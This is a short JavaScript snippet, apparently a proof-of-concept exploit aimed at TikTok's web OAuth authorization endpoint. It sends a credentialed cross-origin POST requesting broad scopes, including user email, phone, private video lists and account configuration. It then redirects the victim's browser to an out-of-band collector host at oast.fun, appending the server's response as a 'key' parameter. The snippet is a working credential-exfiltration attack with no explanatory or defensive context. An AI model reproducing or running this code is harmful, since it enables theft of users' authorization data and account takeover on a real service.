var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("POST", "https://www.tiktok.com/passport/open/web/auth/?client_key=aw8cb3204x0a1g88&scope=user.info.basic%2Cbiz.account.info%2Cvideo.list.private_ads.no_watermark%2Cbizpartner.item.info%2Cvideo.list.no_watermark%2Cbizpartner.user.info%2Cuser.info.showcase%2Ccomment.list%2Ccomment.list.manage%2Cbiz.account.phone%2Cvideo.list.manage%2Cuser.info.phone%2Clive.list%2Cbiz.account.email%2Cuser.account.configure%2Cuser.info.email&aid=1459&source=web&redirect_uri=https%3A%2F%2Fads.tiktok.com%2Fi18n%2Flogin%3F_extra%3DcGxhdGZvcm09dGlrdG9rJmxvZ2luX2FjdGlvbj1yZWRpcmVjdCZmcm9tX3BhZ2U9bG9naW4mb3JpZ2luPWh0dHBzOi8vYWRzLnRpa3Rvay5jb20vaTE4bi9sb2dpbg..%26state%3De6778b3bf9d739cc4a3098853879315bc0323b8c&state=e6778b3bf9d739cc4a3098853879315bc0323b8c");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();
function reqListener() {
    location='//ce3mb4c2vtc00002egfgg8b4f1ryyyyyb.oast.fun/log?key='+this.responseText; 
};
